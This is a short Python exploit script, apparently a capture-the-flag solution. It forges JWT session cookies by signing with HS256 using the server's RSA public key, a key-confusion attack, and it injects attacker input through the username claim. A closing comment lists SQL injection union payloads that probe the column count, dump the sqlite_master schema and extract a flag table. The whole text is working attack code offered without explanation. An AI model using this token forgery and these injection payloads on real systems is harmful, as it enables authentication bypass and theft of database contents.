import jwt
import requests
from colorama import Fore

url = 'http://138.68.141.81:30872/'

key = open('./public_key.pem', 'r').read()

while(1):
    query = input(Fore.GREEN + "Enter the query : " + Fore.RESET)
    payload = {
      "username": "{}".format(query),
      "pk": "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA95oTm9DNzcHr8gLhjZaY\nktsbj1KxxUOozw0trP93BgIpXv6WipQRB5lqofPlU6FB99Jc5QZ0459t73ggVDQi\nXuCMI2hoUfJ1VmjNeWCrSrDUhokIFZEuCumehwwtUNuEv0ezC54ZTdEC5YSTAOzg\njIWalsHj/ga5ZEDx3Ext0Mh5AEwbAD73+qXS/uCvhfajgpzHGd9OgNQU60LMf2mH\n+FynNsjNNwo5nRe7tR12Wb2YOCxw2vdamO1n1kf/SMypSKKvOgj5y0LGiU3jeXMx\nV8WS+YiYCU5OBAmTcz2w2kzBhZFlH6RK4mquexJHra23IGv5UJ5GVPEXpdCqK3Tr\n0wIDAQAB\n-----END PUBLIC KEY-----\n",
      "iat": 1621740611
    }
    token = jwt.encode(payload, key=key, algorithm="HS256").decode('UTF-8')
    cookies = {'session':token}
    res = requests.get(url, cookies=cookies).text
    print(res)
    
    
'''
f' union select null --
f' union select null, null --
f' union select null, null, null --
f' union select 'a', 'b', 'c' --
f' union select 1, group_concat(sql), 3 from sqlite_master --
f' union select 1, group_concat(top_secret_flaag), 3 from flag_storage --
'''
